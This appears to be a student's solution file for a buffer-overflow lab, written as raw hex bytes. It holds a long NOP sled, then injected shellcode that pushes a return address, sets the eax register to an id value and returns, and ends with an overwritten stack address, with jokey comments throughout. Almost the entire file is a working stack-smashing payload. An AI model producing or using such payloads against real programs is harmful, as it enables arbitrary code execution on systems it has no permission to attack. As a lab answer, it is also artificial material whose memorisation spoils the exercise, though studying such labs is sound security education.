90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	/* fill in buffer space */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	/* nop sliiiide... */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	/* weeee! */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	/* almost to the bottom! */
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 	
90 90 90 90 90 90 90 90 90 90 90 90 90
68 56 12 40 00						/* push return location $0x401256 onto stack */
b8 7a 14 1b 5c 						/* update $eax to hold my id */
c3 							/* return */
f8 39 68 55 00 00 00 00					/* jump close to the bottom of the stack */
